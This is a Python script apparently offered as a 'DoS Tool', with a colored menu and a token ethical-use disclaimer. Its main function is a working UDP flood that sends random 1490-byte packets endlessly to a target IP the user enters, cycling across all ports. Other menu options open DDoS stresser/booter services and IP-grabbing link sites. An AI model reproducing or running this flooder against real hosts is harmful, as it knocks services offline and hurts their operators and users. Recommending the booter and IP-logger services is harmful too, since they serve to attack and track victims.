import cv
import keyboard
import os
import subprocess
import time
import sys
import webbrowser
import threading
import socket
import colorama
import random
from datetime import datetime
from colorama import Fore, Back, Style 
colorama.init(autoreset=True)

os.system("cls")

def menu():
    print(Fore.RED + 
        """
    ╭━━━╮╱╱╱╱╱╱╭━━━━╮╱╱╱╱╭╮
    ╰╮╭╮┃╱╱╱╱╱╱┃╭╮╭╮┃╱╱╱╱┃┃
    ╱┃┃┃┣━━┳━━╮╰╯┃┃┣┻━┳━━┫┃
    ╱┃┃┃┃╭╮┃━━┫╱╱┃┃┃╭╮┃╭╮┃┃
    ╭╯╰╯┃╰╯┣━━┃╱╱┃┃┃╰╯┃╰╯┃╰╮
    ╰━━━┻━━┻━━╯╱╱╰╯╰━━┻━━┻━╯
    #By oskitarr

    !!! This is only for ethical use, I am not responsible for the bad acts that you can do !!! """)
    print(Fore.GREEN + """
    
    [1] Flood Script in python (Masive sending of packages) 

    [2] IP stresser

    [3] IP logger
    
    [4] Shortener

    [5] Close
        """)


def FloodScriptW():
    now = datetime.now()
    hour = now.hour
    minute = now.minute
    day = now.day
    month = now.month
    year = now.year

    ##############
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = random._urandom(1490)
    #############

    os.system("cls")

    print("-"*50)
    print("When you wanto to stop press the 'Q'")
    ip = input("IP Target : ")
    port = input("Port       : ")
    port = int(port)

    os.system("cls")
    print ("[====================] 100%")
    time.sleep(3)
    sent = 0
    while True:
        sock.sendto(bytes, (ip,port))
        sent = sent + 1
        port = port + 1
        print ("Sent %s packet to %s throught port:%s"%(sent,ip,port))
        if port == 65534:
            port = 1
        if keyboard.is_pressed("q"):
            print("q pressed, ending loop")
            break
    Windows()

def FloodScriptL():
    now = datetime.now()
    hour = now.hour
    minute = now.minute
    day = now.day
    month = now.month
    year = now.year

    ##############
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = random._urandom(1490)
    #############

    os.system("clear")

    print("-"*50)
    print("When you wanto to stop press the 'Q'")
    ip = input("IP Target : ")
    port = input("Port       : ")
    port = int(port)

    os.system("clear")
    print ("[====================] 100%")
    time.sleep(3)
    sent = 0
    while True:
        sock.sendto(bytes, (ip,port))
        sent = sent + 1
        port = port + 1
        print ("Sent %s packet to %s throught port:%s"%(sent,ip,port))
        if port == 65534:
            port = 1
        if keyboard.is_pressed("q"):
            print("q pressed, ending loop")
            break
    Linux()

def osSelection():
    so = input("""
Wich is your operative system?
[1] Linux
[2] Windows

--->""")

    if so == "1":
        os.system("clear")
        print("Loading...")
        print("[======]25%")
        time.sleep(0.5)
        print("[============]50%")
        time.sleep(0.5)
        print("[==================]75%")
        time.sleep(0.5)
        print("[========================]100%")
        os.system("clear")
        Linux()
    elif so == "2":
        os.system("cls")
        print("Loading...")
        print("[======]25%")
        time.sleep(0.5)
        print("[============]50%")
        time.sleep(0.5)
        print("[==================]75%")
        time.sleep(0.5)
        print("[========================]100%")
        os.system("cls")
        Windows()
    else:   
        print(so, "Is not a valid answer")
        time.sleep(2)

def Menu_InputW():
        ipt = input("--->")
        if ipt == "1":
            os.system('cls')
            time.sleep(0.5)
            FloodScriptW()
        elif ipt == "2":
            os.system('cls')
            print(Fore.GREEN + """
    [1] Stresser & Booter (Best for website)
    [2] IP Stresser (Best for ShutDown Conexions)
    [3] All
    [4] return menu

            """)
            mipt = input("--->")
            if mipt == "1":
                webbrowser.open("https://ipstress.in/")
                time.sleep(0.5)
                Windows()
            elif mipt == "2":
                webbrowser.open("https://freestresser.to/")
                Windows()
            elif mipt == "3":
                webbrowser.open("https://ipstress.in/")
                webbrowser.open("https://freestresser.to/")
                Windows()
            elif mipt == "4":
                Windows()
        elif ipt == "3":
            os.system("cls")
            print(Fore.GREEN + """
    [1] Grabify 
    [2] IP Logger
    [3] All
    [4] return menu            
            """)
            lipt = input("--->")
            if lipt == "1":
                webbrowser.open("https://grabify.link/")
                Windows()
            elif lipt == "2":
                webbrowser.open("https://iplogger.org/es/")
                Windows()
            elif lipt == "3":
                webbrowser.open("https://grabify.link/")
                webbrowser.open("https://iplogger.org/es/")
                Windows()
            elif lipt == "4":
                Windows()
        elif ipt == "5":
            input("Press enter to close...")
        elif ipt == "4":
            webbrowser.open("https://bitly.com/")
def Menu_InputL():
        ipt = input("--->")
        if ipt == "1":
            os.system('clear')
            time.sleep(0.5)
            FloodScriptL()
        elif ipt == "2":
            os.system('clear')
            print(Fore.GREEN + """
    [1] Stresser & Booter (Best for website)
    [2] IP Stresser (Best for ShutDown Conexions)
    [3] All
    [4] return menu

            """)
            mipt = input("--->")
            if mipt == "1":
                webbrowser.open("https://ipstress.in/")
                time.sleep(0.5)
                Windows()
            elif mipt == "2":
                webbrowser.open("https://freestresser.to/")
                Windows()
            elif mipt == "3":
                webbrowser.open("https://ipstress.in/")
                webbrowser.open("https://freestresser.to/")
                Windows()
            elif mipt == "4":
                Windows()
        elif ipt == "3":
            os.system("clear")
            print(Fore.GREEN + """
    [1] Grabify 
    [2] IP Logger
    [3] All
    [4] return menu            
            """)
            lipt = input("--->")
            if lipt == "1":
                webbrowser.open("https://grabify.link/")
                Windows()
            elif lipt == "2":
                webbrowser.open("https://iplogger.org/es/")
                Windows()
            elif lipt == "3":
                webbrowser.open("https://grabify.link/")
                webbrowser.open("https://iplogger.org/es/")
                Windows()
            elif lipt == "4":
                Windows()
        elif ipt == "5":
            input("Press enter to close...")
        elif ipt == "4":
            webbrowser.open("https://bitly.com/")

def Windows():
    os.system("cls")
    menu()
    Menu_InputW()

def Linux():
    os.system("clear")
    menu()
    Menu_InputL()

osSelection()